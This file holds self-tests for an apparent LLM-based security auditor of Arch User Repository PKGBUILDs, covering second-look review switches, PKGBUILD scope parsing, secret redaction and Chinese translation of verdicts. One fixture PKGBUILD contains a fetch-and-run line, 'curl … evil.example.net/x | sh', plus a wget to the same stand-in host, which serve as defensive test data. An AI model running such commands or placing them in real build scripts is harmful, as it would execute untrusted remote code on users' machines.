def selftest_benchmark_arms():
    """The second look is on by default, in-context and at the gate; the
    facts block is off; and each switch's parsing is correct where a wrong
    answer would be worse than no answer."""
    import tempfile

    for var in ("AUR_SLEUTH_SECOND_LOOK", "AUR_SLEUTH_SECOND_LOOK_GATE", "AUR_SLEUTH_FACTS"):
        assert var not in os.environ or not os.environ[var], f"{var} is set in this test run"
    assert second_look_mode() == "incontext", "the default is the measured winner"
    assert second_look_at_gate() is True
    assert facts_block_enabled() is False, "the facts block measured as noise and stays off"
    os.environ["AUR_SLEUTH_SECOND_LOOK"] = "nonsense"
    assert second_look_mode() == "", "an unknown mode must disable, not guess"
    for off in ("off", "none", "0"):
        os.environ["AUR_SLEUTH_SECOND_LOOK"] = off
        assert second_look_mode() == "", off
    os.environ["AUR_SLEUTH_SECOND_LOOK"] = "fresh"
    assert second_look_mode() == "fresh"
    os.environ.pop("AUR_SLEUTH_SECOND_LOOK")

    # A second look may only soften. The table is what enforces it.
    assert _SEVERITY[SafeStatus.SAFE] < _SEVERITY[SafeStatus.INCONCLUSIVE]
    assert _SEVERITY[SafeStatus.INCONCLUSIVE] < _SEVERITY[SafeStatus.UNSAFE]

    # The gate has its own switch, because an UNSAFE there aborts the whole
    # audit: it can be kept out of the gate while the file review keeps it.
    for off in ("0", "false", "off"):
        os.environ["AUR_SLEUTH_SECOND_LOOK_GATE"] = off
        assert second_look_at_gate() is False, off
    os.environ["AUR_SLEUTH_SECOND_LOOK_GATE"] = "1"
    assert second_look_at_gate() is True
    os.environ.pop("AUR_SLEUTH_SECOND_LOOK_GATE")

    # A re-ask at the gate must carry the gate's own scope. Items 4 through 7
    # are written for the full review, where code that runs at build time is
    # in scope; at the gate it is not, and a second look told otherwise would
    # keep a verdict the gate has no business holding. It also has to say that
    # a SKIPped checksum is not grounds to fail there -- the mistake CLAUDE.md
    # records being made twice.
    gate_q = _second_look_question("somepkg", at_gate=True)
    review_q = _second_look_question("somepkg", at_gate=False)
    assert "--noprepare" in gate_q and "--noprepare" not in review_q
    assert "SKIP" in gate_q
    assert "do NOT run prepare(), build() or package()" in gate_q
    for q in (gate_q, review_q):
        assert _CALIBRATION_MARKER in q, "the rules must travel with the question"
        assert "<decision>" in q, "the reply has to be parseable"

    # The rules a second look applies are sliced from the prompt, not copied,
    # so they cannot drift from the rules the first pass was given.
    rules = calibration_rules("somepkg")
    assert rules.startswith(_CALIBRATION_MARKER), rules[:60]
    assert "7. Recognize AUR MAINTAINER HELPER SCRIPTS" in rules
    assert "You are a security expert" not in rules, "sliced too much"

    # Function bodies are not global scope. What makepkg runs while sourcing
    # the file is the whole point of the distinction.
    pkgbuild = (
        'pkgname=t\n'
        'url="https://up.example.org/x"\n'
        '_urls=$(curl -sL "$url" | grep tar.gz)\n'
        'depends=(alsa-lib curl gst-plugins)\n'
        'pkgdesc="downloads with curl"\n'
        'build() {\n'
        '  curl -sL https://evil.example.net/x | sh\n'
        '  install -d "${pkgdir}/usr"\n'
        '}\n'
        'package() {\n'
        '  wget https://evil.example.net/y\n'
        '}\n'
    )
    outside = _pkgbuild_global_scope(pkgbuild)
    assert "_urls=$(curl" in outside
    assert "evil.example.net" not in outside, "a function body leaked into global scope"

    # The word is not the command: `depends=(curl)` and a pkgdesc mentioning it
    # counted as fetches once, which reported two in a PKGBUILD fetching none.
    hits = [ln for ln in outside.splitlines() if _PKGBUILD_FETCH_RE.search(ln)]
    assert len(hits) == 1, hits
    assert "depends=" not in hits[0] and "pkgdesc=" not in hits[0]

    with tempfile.TemporaryDirectory() as d:
        pkgdir = Path(d)
        (pkgdir / "PKGBUILD").write_text(pkgbuild)
        # No .SRCINFO here, so the source counts are absent and the block
        # carries only what could be determined. A fact nobody could compute
        # must simply not appear.
        facts = packaging_facts(pkgdir, pkgdir / "PKGBUILD")
        assert "global scope" in facts and "up.example.org" in facts, facts
        assert "names \"PKGBUILD\"" not in facts, "pointless self-reference"
        # For any other file the naming fact is the useful one.
        facts = packaging_facts(pkgdir, pkgdir / "helper.sh")
        assert 'names "helper.sh": no' in facts, facts
        (pkgdir / "PKGBUILD").write_text(pkgbuild + "\n# see helper.sh\n")
        assert 'names "helper.sh": yes' in packaging_facts(pkgdir, pkgdir / "helper.sh")

    print("✓ selftest_benchmark_arms")


def selftest_redaction():
    """What the environment says about this machine never reaches a report:
    the endpoint host, a home directory, a credential-shaped value, and the
    operator's own list -- while a public API host is left alone."""
    import tempfile

    env = {
        "OPENAI_BASE_URL": "http://llm.internal.example:8080/v1",
        "HOME": "/home/tester",
        "OPENAI_API_KEY": "sk-or-v1-abcdef0123456789",
        "SHORT_KEY": "abc",
        "AUR_SLEUTH_INTERNAL_STRINGS": "corp.lan,user_secretid",
    }
    needles = operator_strings(env)
    assert "llm.internal.example" in needles and "/home/tester" in needles, needles
    assert "sk-or-v1-abcdef0123456789" in needles and "abc" not in needles, needles
    assert {"corp.lan", "user_secretid"} <= set(needles), needles
    text = (
        "called http://llm.internal.example:8080/v1 from /home/tester/x "
        "with sk-or-v1-abcdef0123456789 for user_secretid at corp.lan"
    )
    out = redact(text, needles)
    for s in needles:
        assert s not in out, out
    assert out.count(REDACTED) == 5, out
    assert "openrouter.ai" not in operator_strings(
        {"OPENAI_BASE_URL": "https://openrouter.ai/api/v1"}
    )
    assert operator_strings({"HOME": "/root"}) == []

    # The report applies it on every write.
    saved = {k: os.environ.get(k) for k in env}
    os.environ.update(env)
    try:
        with tempfile.TemporaryDirectory() as d:
            path = Path(d) / "r.txt"
            with Report(path) as report:
                report.write("endpoint llm.internal.example answered for user_secretid")
            written = path.read_text(encoding="utf-8")
    finally:
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    assert "llm.internal.example" not in written and "user_secretid" not in written, written
    assert written.count(REDACTED) == 2, written


def selftest_i18n():
    """Language selection, translation lookup, and the console/report split.

    The split is the load-bearing part: the report file must never carry a
    translated string, because it is archived to the public branch and parsed
    by bench scripts. TUIPlain renders text to the terminal and English to the
    report; this asserts both sides of that boundary.
    """
    import contextlib
    import io

    saved = {k: os.environ.get(k) for k in ("AUR_SLEUTH_LANG", "LC_ALL", "LC_MESSAGES", "LANG")}
    try:
        # Explicit AUR_SLEUTH_LANG wins over the locale variables.
        os.environ.pop("AUR_SLEUTH_LANG", None)
        os.environ["LANG"] = "zh_CN.UTF-8"
        assert current_language() == "zh_CN", current_language()
        assert _("Cloning {clone_url}...") == "正在克隆 {clone_url}...", _("Cloning {clone_url}...")
        assert _("No such string at all") == "No such string at all"

        # Unsupported locales and unsupported explicit values fall back to en.
        os.environ["LANG"] = "de_DE.UTF-8"
        assert current_language() == "en", current_language()
        os.environ["LANG"] = "C"
        assert current_language() == "en", current_language()
        os.environ["AUR_SLEUTH_LANG"] = "zh"  # the bare shorthand resolves
        assert current_language() == "zh_CN", current_language()
        os.environ["AUR_SLEUTH_LANG"] = "bogus"
        assert current_language() == "en", current_language()

        # Console localized, report English, in one call.
        os.environ["AUR_SLEUTH_LANG"] = "zh"
        buf = io.StringIO()
        with tempfile.TemporaryDirectory() as d:
            path = Path(d) / "r.txt"
            with Report(path) as report:
                with TUIPlain(report) as tui:
                    with contextlib.redirect_stdout(buf):
                        tui.update_status(
                            _("Cloning {clone_url}...").format(clone_url="https://x"),
                            report_msg="Cloning https://x...",
                        )
                        tui.finalize_step(
                            _("Cloned {package_name}").format(package_name="foo"),
                            report_msg="Cloned foo",
                        )
            written = path.read_text(encoding="utf-8")
        assert "正在克隆 https://x..." in buf.getvalue(), buf.getvalue()
        assert "已克隆 foo" in buf.getvalue(), buf.getvalue()
        assert "Cloning https://x..." in written and "Cloned foo" in written, written
        assert "正在" not in written and "已克隆" not in written, written
    finally:
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    print("✓ selftest_i18n")


def selftest_verdict_translation():
    """The display-layer verdict translation: reply parsing, gating, and the
    guarantee that the report path never sees the translated prose."""

    # Parser: well-formed replies round-trip; malformed ones keep English.
    parsed = _parse_verdict_translations(
        '<translations><item index="0"><summary>中文</summary><details>详情</details></item>'
        '<item index="1"><summary>s2</summary></item></translations>'
    )
    assert parsed == {0: ("中文", "详情"), 1: ("s2", "")}, parsed
    assert _parse_verdict_translations("no xml at all") == {}
    assert _parse_verdict_translations("") == {}
    assert _parse_verdict_translations(
        '<translations><item index="x"><summary>a</summary></item></translations>'
    ) == {}

    saved = {k: os.environ.get(k) for k in ("AUR_SLEUTH_LANG", "AUR_SLEUTH_DRY_RUN", "AUR_SLEUTH_TRANSLATE_VERDICTS")}
    try:
        # Gating: OFF by default (it costs a second call per flagged verdict);
        # true turns it on for a non-English console; never in dry-run; the
        # language's own absence of a translator also disables it (the batch).
        os.environ.pop("AUR_SLEUTH_DRY_RUN", None)
        os.environ.pop("AUR_SLEUTH_TRANSLATE_VERDICTS", None)
        os.environ["AUR_SLEUTH_LANG"] = "zh"
        assert not verdict_translation_enabled(), "off by default, even for zh"
        os.environ["AUR_SLEUTH_TRANSLATE_VERDICTS"] = "true"
        assert verdict_translation_enabled(), "explicit on for zh"
        os.environ["AUR_SLEUTH_LANG"] = "en"
        assert not verdict_translation_enabled(), "never into English"
        os.environ["AUR_SLEUTH_LANG"] = "zh"
        os.environ["AUR_SLEUTH_TRANSLATE_VERDICTS"] = "false"
        assert not verdict_translation_enabled(), "explicit off wins"
        os.environ["AUR_SLEUTH_TRANSLATE_VERDICTS"] = "true"
        os.environ["AUR_SLEUTH_DRY_RUN"] = "1"
        assert not verdict_translation_enabled(), "dry-run never translates"
    finally:
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v

    # Language selection from the SYSTEM locale, with regional priority:
    # exact (zh_CN) -> bare (zh) -> any other zh_XX -> en; the shipped entry
    # is zh_CN, so other zh_* locales fall back to it. AUR_SLEUTH_LANG is
    # only an explicit override; the locale alone must select the language.
    saved2 = {k: os.environ.get(k) for k in ("AUR_SLEUTH_LANG", "LC_ALL", "LC_MESSAGES", "LANG")}
    try:
        os.environ.pop("AUR_SLEUTH_LANG", None)
        os.environ["LANG"] = "zh_CN.UTF-8"
        assert current_language() == "zh_CN", current_language()  # exact match
        os.environ["LANG"] = "zh_TW.UTF-8"
        assert current_language() == "zh_CN", current_language()  # other zh_XX falls back
        os.environ["LANG"] = "de_DE.UTF-8"
        assert current_language() == "en", current_language()
        os.environ["LANG"] = "C"
        assert current_language() == "en", current_language()
        os.environ["AUR_SLEUTH_LANG"] = "zh_cn"  # explicit override, case-insensitive
        assert current_language() == "zh_CN", current_language()
    finally:
        for k, v in saved2.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v

    # The batch call, end to end: one fake translator call produces the
    # Chinese prose; the report text stays English; only the console render
    # carries the translation, and only for the verdicts worth reading.
    class FakeLLM:
        last = None
        def __init__(self, **kwargs):
            self.kwargs = kwargs
            FakeLLM.last = self
        def chat(self, _prompt):
            return (
                '<translations><item index="0"><summary>不安全总结</summary>'
                "<details>不安全详情</details></item></translations>"
            )

    class _UsageClient:
        def get_usage_summary(self):
            return {
                "total": {"prompt_tokens": 0, "completion_tokens": 0,
                          "total_tokens": 0, "total_cost": 0},
                "by-model": {},
            }

    class FakeTUI:
        def __init__(self):
            self.statuses = []
        def update_status(self, text, report_msg=None):
            self.statuses.append((text, report_msg))

    saved2 = {k: os.environ.get(k) for k in ("AUR_SLEUTH_LANG", "AUR_SLEUTH_DRY_RUN", "AUR_SLEUTH_TRANSLATE_VERDICTS")}
    import types
    old_llm, old_params = LLM, get_llm_params_from_env
    try:
        os.environ["AUR_SLEUTH_LANG"] = "zh"
        os.environ["AUR_SLEUTH_TRANSLATE_VERDICTS"] = "true"
        os.environ.pop("AUR_SLEUTH_DRY_RUN", None)
        globals()["LLM"] = FakeLLM
        globals()["get_llm_params_from_env"] = lambda: types.SimpleNamespace(model="fake-model")
        pkg = Path("/tmp/fake-pkg")
        safe = AuditResult(pkg / "a", pkg, SafeStatus.SAFE, "all fine", details="nothing here")
        bad = AuditResult(pkg / "b", pkg, SafeStatus.UNSAFE, "malicious curl", details="exfiltrates /etc/shadow")
        incon = AuditResult(pkg / "c", pkg, SafeStatus.INCONCLUSIVE, "no verdict", details="parse failed")
        tui = FakeTUI()
        VERDICT_TRANSLATIONS.clear()
        translate_verdicts_batch(tui, object(), [safe, bad, incon], "fake-pkg")
        assert id(bad) in VERDICT_TRANSLATIONS, VERDICT_TRANSLATIONS
        assert VERDICT_TRANSLATIONS[id(bad)] == ("不安全总结", "不安全详情")
        assert id(safe) not in VERDICT_TRANSLATIONS, "SAFE verdicts are not translated"
        # The fake reply carries only index 0; a missing item keeps English.
        assert id(incon) not in VERDICT_TRANSLATIONS, VERDICT_TRANSLATIONS
        # The TUI said it was translating instead of sitting on "reviewing".
        assert any("正在翻译审查结论" in t or "Translating verdicts for display" in r for t, r in tui.statuses), tui.statuses
        # The translator instruction comes from the language table, not from a
        # hardcoded prompt: the system prompt the call was built with is the
        # table's zh entry.
        assert FakeLLM.last is not None and "你是翻译" in FakeLLM.last.kwargs.get("system_prompt", ""), (
            FakeLLM.last.kwargs if FakeLLM.last else None
        )
        # Console render uses the translation; the report render does not.
        by_status = partition_results_by_status([safe, bad, incon])
        console = generate_report_text(pkg, by_status, use_color=False, execution_time=1.0,
                                       llm_client=_UsageClient(), translations=VERDICT_TRANSLATIONS)
        report = generate_report_text(pkg, by_status, use_color=False, execution_time=1.0,
                                      llm_client=_UsageClient())
        assert "不安全详情" in console and "不安全总结" in console, console
        assert "malicious curl" in report and "不安全" not in report, report
        assert "总结：" in console, console  # labels localize on the console
        assert "Summary: " in report, report  # labels stay English in the report
        # A language with display strings but no translator instruction gets
        # no translation at all: never prompt for the wrong target language.
        saved_table = dict(_TRANSLATIONS)
        try:
            _TRANSLATIONS["zz-fake"] = {"Some display": "某显示"}
            os.environ["AUR_SLEUTH_LANG"] = "zz-fake"
            VERDICT_TRANSLATIONS.clear()
            tui.statuses.clear()
            translate_verdicts_batch(tui, object(), [bad], "fake-pkg")
            assert not VERDICT_TRANSLATIONS, VERDICT_TRANSLATIONS
            assert not tui.statuses, "no translating status without a translator"
        finally:
            _TRANSLATIONS.clear()
            _TRANSLATIONS.update(saved_table)
            os.environ["AUR_SLEUTH_LANG"] = "zh"
    finally:
        globals()["LLM"] = old_llm
        globals()["get_llm_params_from_env"] = old_params
        for k, v in saved2.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    print("✓ selftest_verdict_translation")


